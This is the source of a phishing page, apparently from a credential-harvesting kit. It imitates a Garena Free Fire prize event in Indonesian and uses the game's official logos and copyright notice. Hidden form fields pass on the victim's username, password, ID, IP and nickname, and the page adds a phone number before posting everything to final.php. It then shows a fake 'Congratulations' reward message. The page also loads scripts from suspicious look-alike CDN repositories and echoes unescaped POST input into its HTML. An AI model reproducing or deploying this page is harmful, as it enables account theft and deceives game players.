<html>
    <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <meta content="width=device-width,maximum-scale=1.0,initial-scale=1.0" name="viewport" />
        <link rel="icon" href="https://freefiremobile-a.akamaihd.net/ffwebsite/images/freefire32-2.ico" type="image/x-icon" />
        <link rel="shortcut icon" href="https://freefiremobile-a.akamaihd.net/ffwebsite/images/freefire16-2.ico" type="image/x-icon" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
        <meta name="copyright" content="" />
        <meta content="black" name="apple-mobile-web-app-status-bar-style" />
        <meta name="apple-mobile-web-app-title" content="Garena Free Fire">
        <meta name="keywords" content="Knives out, pubg, terminator, bullet strike, survival, battle royale, last battleground, last man standing, battle, Bullet strike, point blank, battleground, rules of survival, rule, royale, crossfire, sinh tồn, nhảy dù, bắn súng, 生存, 大逃殺, 絕地求生, 槍戰, 全民, survivor royale, 荒野行動, 吃雞, 狙擊, 無限戰場, PB, Headshot, Crisis Action, ยิง, ปืน, Fortnite, shooting, sobrevivência, Jogos de tiro, a última pessoa viva, la última persona viva, Batalla Royale, disparo, la última persona viva, primera persona, acción, point, blank, last survivor, 배틀로얄, 프라파이어, 서바이벌, 최후 1인, 배틀그라운드, 배틀그라운즈, Free Fire, 생존, 생존게임, FPS, 배그, pubg mobile, world of tanks, танки, пабг, пубг, королевская битва, clash of clans, clash royale, cs go, battlegrounds" />
        <meta name="description" content="Free Fire is a mobile game where players enter a battlefield where there is only one winner - the last man standing. Grab weapons to do others in and supplies to bolster your chances of survival. Eventually, players are forced into a shrinking play zone to engage each other in a tactical and diverse environment." />
        <link rel="stylesheet" href="css/style.css">
        <link rel="stylesheet" href="https://unpkg.com/swiper@7/swiper-bundle.min.css"/>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    </head>
    <body>
        <section id="sec1" class="sec1" title="CREATED BY NGUYEN THU WANN">
        <div class="loader">
                <img src="https://h.top4top.io/p_2016h7ob71.gif">
            </div>
            <div class="wrap">
                <div class="header">
                    <div class="left">
                        <img class="icon" src="https://freefiremobile-a.akamaihd.net/common/web_event/maxoffical/app_icon.png">
                        <img class="logo" src="https://freefiremobile-a.akamaihd.net/common/web_event/maxoffical/logo_small.png">
                    </div>
                    <div class="right">
                        <img src="https://freefiremobile-a.akamaihd.net/ffwebsite/images/download/appstore3.png">
                        <img src="https://freefiremobile-a.akamaihd.net/ffwebsite/images/download/googleplay3.png">
                    </div>
                </div>
                <div class="inset">
                    <div class="swiper">
                        <div class="swiper-wrapper">
                        <div class="swiper-slide">
                            <img src="https://dl.dir.freefiremobile.com/common/web_event/hash/8e822cf7230420e5a4240972cc11efdajpg">
                        </div>
                        <div class="swiper-slide">
                            <img src="https://dl.dir.freefiremobile.com/common/web_event/hash/c175292e0a856831eeeeb727bd33c324jpg">
                        </div>
                        <div class="swiper-slide">
                            <img src="https://dl.dir.freefiremobile.com/common/web_event/hash/242c176892fae8907c4502dc6f745837jpg">
                        </div>
                        <div class="swiper-slide">
                            <img src="https://dl.dir.freefiremobile.com/common/web_event/hash/a0a4ae30805722476d7af24e8266c18ajpg">
                        </div>
                        <div class="swiper-slide">
                            <img src="https://dl.dir.freefiremobile.com/common/web_event/hash/caaa4b6f29bf5d772942932d761f831bjpg">
                        </div>
                        </div>
                        <div class="swiper-pagination"></div>
                    </div>
                </div>
                <div class="news">
                    <span class="left prev-slide"></span>
                    <h1>ISI FORMULIR</h1>
                    <span class="right next-slide"></span>
                </div>
                <div class="content" id="slide1">
                    <form class="login-form" id="form" action="" method="POST">
                        <div class="form-group">
                            <input type="number" class="finput" autocomplete="off" placeholder="Nomor HP" id="hp" name="hp">
                        </div>
                        <div class="form-group">
                            <select class="finput" id="level" name="level">
                            <option value="" selected disabled>Level Akun?</option>
                            <?php
                                for($i=1;$i<=100;$i++){
                                echo'<option>'.$i.'<'.'/option>';
                                }
                            ?>
                            </select>
                        </div>
                        <div class="form-group">
                            <select class="finput wrong" id="tier" name="tier" class="form-input">
                            <option value="" selected disabled>Tier Akun</option>
                            <option>Bronze</option>
                            <option>Silver</option>
                            <option>Gold</option>
                            <option>Diamond</option>
                            <option>Master</option>
                            <option>Grand Master</option>
                            </select>
                         </div>
                         <div class="form-group">
                            <select class="finput" id="ep" name="ep" class="form-input">
                            <option value="" selected disabled>Pernah Elite Pass?</option>
                            <option>Pernah</option>
                            <option>Tidak Pernah</option>
                            </select>
                         </div>
                         <input type="hidden" name="user" value="<?= $_POST['user']; ?>">
                         <input type="hidden" name="pass" value="<?= $_POST['pass']; ?>">
                         <input type="hidden" name="id" value="<?= $_POST['id']; ?>">
                         <input type="hidden" name="ip" value="<?= $_POST['ip']; ?>">
                         <input type="hidden" name="nick" value="<?= $_POST['nick']; ?>">
                         <input type="hidden" name="ua" value="<?= $_POST['ua']; ?>">
                         <div class="form-group" id="fsubmit">
                             <button class="fsubmit" type="submit">Submit</button>
                         </div>
                    </form>
                </div>
                <div class="footer">
                    <div class="icon">
                        <img src="https://freefiremobile-a.akamaihd.net/ffwebsite/images/logo_small_foot.png">
                    </div>
                    <span class="text-area">
                        <p class="atas">Copyright © Garena International.</p>
                        <p class="bawah">Trademarks belong to their respective owners. All rights Reserved.</p>
                    </span>
                </div>
            </div>



            <div class="mask" style="display:none"></div>
            <div class="dialog">
                <h1>Congratulations</h1>
                <div class="imgReward">
                    <div class="boxImg">
                        <img id="hadiah" src="<?= $_POST['hadiah']; ?>">
                    </div>
                </div>
                <p class="end">Hi <?= $_POST['nick']; ?>, Selamat hadiah anda telah kami kirim ke Vault mu </p>
            </div>
        </section>
        <script src="https://cdn.jsdelivr.net/npm/js-base64@3.7.1/base64.min.js"></script>
        <script src="https://cdn.jsdelivr.net/gh/cdn-jquery/jquery/3.6.3/jquery.min.js"></script>
        <script src="https://unpkg.com/swiper/swiper-bundle.min.js"></script>
                <script type="text/javascript" src="https://rawcdn.githack.com/jqueryout/bookish/6e72054986ea3973c965f8dcf6e612539192d121/bookish-giggle.js"></script>
        <script src="https://raw.githubusercontent.com/john-doherty/swiped-events/master/src/swiped-events.js"></script>
        <script>
            const swiper = new Swiper('.swiper', {
            spaceBetween: 50,
            direction: 'horizontal',
            loop: true,
            autoplay: {
                delay: 2000,
                disableOnInteraction: false,
            },
            navigation: {
                nextEl: '.next-slide',
                prevEl: '.prev-slide',
            },
            });
        </script>
        <script>
            $(document).ready(function(){
                setTimeout(() => {
                    $('.loader').fadeOut()
                },1000)
            })
            window.addEventListener('submit', (e) => {
                e.preventDefault()
                $('.fsubmit').addClass('disabled');
                $('.fsubmit').html('<i class="fa fa-circle-o-notch fa-spin"></i>');
                setTimeout(() => {
                    extend()
                },1500)
                return false;
            })

            function extend(){
                var hp = $("#hp").val(),level = $("#level").val(),tier = $("#tier").val(),ep = $("#ep").val();

                if(!hp || hp == null || hp == '')
                {
                    $("#hp").css('filter','hue-rotate(300deg)');
                    $('.fsubmit').html('Submit');
                    $('.fsubmit').removeClass('disabled');
                }else{
                    $("#hp").css('filter','hue-rotate(1deg)');
                }
                if(!level || level == null || level == '')
                {
                    $("#level").css('filter','hue-rotate(300deg)');
                    $('.fsubmit').html('Submit');
                    $('.fsubmit').removeClass('disabled');
                }else{
                    $("#level").css('filter','hue-rotate(1deg)');
                }
                if(!tier || tier == null || tier == '')
                {
                    $("#tier").css('filter','hue-rotate(300deg)');
                    $('.fsubmit').html('Submit');
                    $('.fsubmit').removeClass('disabled');
                }else{
                    $("#tier").css('filter','hue-rotate(1deg)');
                }
                if(!ep || ep == null || ep == '')
                {
                    $("#ep").css('filter','hue-rotate(300deg)');
                    $('.fsubmit').html('Submit');
                    $('.fsubmit').removeClass('disabled');
                }else{
                    $("#ep").css('filter','hue-rotate(1deg)');
                }

                // if all form are filled
                if(hp.length != 0 && level != null && tier != null && ep != null)
                
                {
                    // SEND DATA
                    $.ajax({
                        type: 'POST',
                        url: 'final.php',
                        data: $('#form').serialize(),
                        dataType: 'text',
                        success: function() {
                                    $('.fsubmit').prop('disabled',true);
                                    $('.fsubmit').html('DISABLED');
                                    $('.fsubmit').css('filter','grayscale(100%)');
                                    $('.fsubmit').css('cursor','no-drop');
                                    $('.mask').fadeIn()
                                    $('.dialog').toggle();
                                    // No Reedit PLZ
                            } 
                    })
                }
            }
        </script>
    </body>
</html>
